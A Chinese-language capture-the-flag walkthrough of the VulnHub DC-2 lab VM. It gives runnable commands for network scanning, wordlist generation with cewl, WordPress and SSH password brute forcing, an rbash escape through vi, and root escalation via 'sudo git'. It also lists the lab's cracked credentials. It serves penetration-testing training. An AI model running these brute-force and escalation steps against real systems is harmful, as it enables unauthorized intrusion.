# DC2-WalkThrough

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**靶机地址**
- https://www.vulnhub.com/entry/dc-2,311/

**Description**

Much like DC-1, DC-2 is another purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing.

As with the original DC-1, it's designed with beginners in mind.

Linux skills and familiarity with the Linux command line are a must, as is some experience with basic penetration testing tools.

Just like with DC-1, there are five flags including the final flag.

And again, just like with DC-1, the flags are important for beginners, but not so important for those who have experience.

In short, the only flag that really counts, is the final flag.

For beginners, Google is your friend. Well, apart from all the privacy concerns etc etc.

I haven't explored all the ways to achieve root, as I scrapped the previous version I had been working on, and started completely fresh apart from the base OS install.

**Technical Information**

DC-2 is a VirtualBox VM built on Debian 32 bit, so there should be no issues running it on most PCs.

While I haven't tested it within a VMware environment, it should also work.

It is currently configured for Bridged Networking, however, this can be changed to suit your requirements. Networking is configured for DHCP.

Installation is simple - download it, unzip it, and then import it into VirtualBox and away you go.

Please note that you will need to set the hosts file on your pentesting device to something like:

`192.168.0.145 dc-2`

Obviously, replace 192.168.0.145 with the actual IP address of DC-2.

It will make life a whole lot simpler (and a certain CMS may not work without it).

If you're not sure how to do this, instructions are here.

**知识点**
- 字典生成工具 cewl (flag2)
- wpscan (flag2)
- rbash 逃逸 (flag4)
- git 提权 (flag5)

**实验环境**

`环境仅供参考`

- VMware® Workstation 15 Pro - 15.0.0 build-10134415
- kali : NAT 模式,192.168.141.134
- 靶机 : NAT 模式

---

# flag1

老规矩,先知道对面 IP 才行,使用 nmap 扫描

语法 `nmap -sP <网段>/24`

```bash
nmap -sP 192.168.141.0/24
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/1.png)

排除法,去掉自己、宿主机、网关, `192.168.141.136` 就是目标了

顺便扫一下端口
```bash
nmap -T5 -A -v -p- 192.168.141.136
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/3.png)

可以看到,开放了 web 和 ssh 服务

下面开始前先按照信息修改主机 hosts 文件

这里的 kali 进行攻击,修改步骤如下
```bash
echo "192.168.141.136 dc-2" >> /etc/hosts
```

然后 web 访问,就可以看到 flag1

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/2.png)

```
Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
```
机翻
```
你惯用的字词列表可能无法使用，因此，也许你只需要 cewl。

密码越多越好，但有时你根本无法赢得所有密码。

以一个身份登录以查看下一个标志。

如果找不到，请以其他身份登录。
```

---

# flag2

flag1 提示了一个工具 cewl,这是个抓取网站信息用于生成密码的工具,估计意思就是让你用这个工具跑个密码表出来

cewl kali 下自带,直接使用就是了
```bash
cewl http://dc-2 -w out.txt
```

密码表有了,那么就应该爆破了,目标这个网站一看用的就是 wordpress,默认的登录地址一般是 `/wp-admin` 或 `/wp-login.php`

不要使用 kali 自带的 burp 直接跑,你会急得想砸电脑,kali 默认的 burp 是社区版,那个爆破速度基本没用,burp 使用教程参考 [BurpSuite笔记](../../../工具/BurpSuite.md#Intruder)

接下来使用一个工具 WPScan,同样 kali 自带
```bash
wpscan --url http://dc-2 --enumerate u
wpscan --url http://dc-2 --passwords out.txt
```

爆破结果,存在2个账户

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/5.png)

```
Username : jerry
Password : adipiscing

Username : tom
Password : parturient
```

使用账号 jerry 登录后可以发现 flag2

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/4.png)

```
If you can't exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
```
机翻
```
如果你无法利用 WordPress 并采取捷径，那还有另一种方法。

希望你找到另一个入口点。
```

flag 提示,如果 wordpress 打不下来,就得换一个入口

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/6.png)

上面使用了 wpscan 进行了扫描和爆破,但是漏洞扫描没有任何结果,因为现在 wpscan 扫描漏洞需要 API Token 的支持,所以需要访问 https://wpvulndb.com/users/sign_up 注册一个账号,获得 API Token
```bash
wpscan --url http://dc-2/ --api-token 这边填你的APIToken
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/7.png)

看了下,大部分需要认证,并且都是 XSS 之类的,靶机这环境根本没用,有一个 WordPress 3.7-5.0 (except 4.9.9) - Authenticated Code Execution 可以试一试,反正也有账号

根据信息,CVE 编号为 CVE-2019-8942、CVE-2019-8943,MSF 里正好有模块,不过其实是不好利用的,因为这个漏洞是通过文件上传造成的,而 jerry 和 tom 都无法上传,只有 admin 有权限修改上传点

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/8.png)

---

# flag3

既然打不下来 wordpress ,就换一个,联想到端口扫描出的 7744 SSH 服务,这里可以作为一个入口

这里使用 [SNETCracker](https://github.com/shack2/SNETCracker) 这个工具爆破 SSH,注意这个软件是在windows下运行的,且爆破时线程尽量调量为低,账号密码字典就使用之前 cewl 生产出来的字典

爆破结果
```
Username : tom
Password : parturient
```

直接登录
```bash
ssh tom@192.168.141.136 -p 7744
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/9.png)

看来是个受限制的 shell 环境,rbash,使用自动补全命令 compgen -c

可以看到我们能使用 less 和 vi ,less 查看 flag3
```
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```
机翻
```
可怜的老 Tom 总是追随 Jerry。 也许他应该承受自己造成的所有压力。
```

这里提示了之前爆破出的2个 web 用户,会不会 linux 也有这2个用户?查看 passwd 文件
```bash
less /etc/passwd
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/10.png)

可见 jerry 用户存在,那么下面就是 rbash 逃逸-->提权

---

# flag4

使用 vi 进行逃逸
```
vi

:set shell=/bin/sh
:shell
```

更改环境变量,把 `/bin/sh` 目录加进去,不然许多命令不好用
```bash
echo $PATH
export PATH=$PATH:/bin:/usr/bin
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/11.png)

ok,现在是正常的 shell 环境了,在提权之前,尝试登录 jerry 用户
```bash
su jerry
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/12.png)

```
Good to see that you've made it this far - but you're not home yet.

You still need to get the final flag (the only flag that really counts!!!).

No hints here - you're on your own now.  :-)

Go on - git outta here!!!!
```
机翻
```
很高兴看到你已经做到了这一点-但你还没有回家。

你仍然需要获得最终标志（唯一真正重要的标志！！！）。

这里没有提示-你现在就一个人了。 :-)

继续-git outta here !!!!
```

这里提到了 git,那么就用它提权

---

# flag5

在 https://gtfobins.github.io/gtfobins/git/ 找到 git 提权的语法
```
sudo git -p help config
!/bin/sh
```

![](../../../../../../assets/img/安全/实验/靶机/VulnHub/DC/DC2/13.png)

提权成功,感谢靶机作者 @DCUA7,查看最终 flag

```bash
cd
cat final-flag.txt
```
```
 __    __     _ _       _                    _
/ / /\ \ \___| | |   __| | ___  _ __   ___  / \
\ \/  \/ / _ \ | |  / _` |/ _ \| '_ \ / _ \/  /
 \  /\  /  __/ | | | (_| | (_) | | | |  __/\_/
  \/  \/ \___|_|_|  \__,_|\___/|_| |_|\___\/


Congratulatons!!!

A special thanks to all those who sent me tweets
and provided me with feedback - it's all greatly
appreciated.

If you enjoyed this CTF, send me a tweet via @DCAU7.
```
